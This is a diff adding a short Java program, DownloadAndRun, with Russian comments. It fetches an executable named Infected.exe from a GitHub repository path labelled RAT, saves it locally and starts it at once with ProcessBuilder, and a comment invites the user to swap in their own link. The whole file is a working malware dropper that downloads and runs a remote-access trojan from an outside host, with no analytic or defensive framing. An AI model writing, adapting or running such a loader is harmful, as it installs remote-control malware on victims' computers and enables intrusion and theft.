@@ -1,0 +1,54 @@
+import java.io.BufferedInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class DownloadAndRun {
+
+    public static void main(String[] args) {
+        String fileURL = "https://github.com/kiwpopr/RAT/raw/refs/heads/main/Infected.exe"; // Замените на вашу ссылку
+        String saveDir = "infected.exe"; // Путь для сохранения файла
+
+        try {
+            // Скачивание файла
+            downloadFile(fileURL, saveDir);
+
+            // Запуск исполняемого файла
+            runExecutable(saveDir);
+        } catch (IOException e) {
+            e.printStackTrace(); // Обработка исключений, если необходимо
+        }
+    }
+
+    private static void downloadFile(String fileURL, String saveDir) throws IOException {
+        URL url = new URL(fileURL);
+        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
+        httpConn.setRequestMethod("GET");
+        httpConn.connect();
+
+        // Проверка ответа сервера
+        if (httpConn.getResponseCode() != HttpURLConnection.HTTP_OK) {
+            throw new IOException("Ошибка при скачивании файла: " + httpConn.getResponseCode());
+        }
+
+        // Сохранение файла
+        try (InputStream inputStream = new BufferedInputStream(httpConn.getInputStream());
+             FileOutputStream outputStream = new FileOutputStream(saveDir)) {
+
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = inputStream.read(buffer)) != -1) {
+                outputStream.write(buffer, 0, bytesRead);
+            }
+        } finally {
+            httpConn.disconnect();
+        }
+    }
+
+    private static void runExecutable(String filePath) throws IOException {
+        ProcessBuilder processBuilder = new ProcessBuilder(filePath);
+        processBuilder.start();
+    }
+}
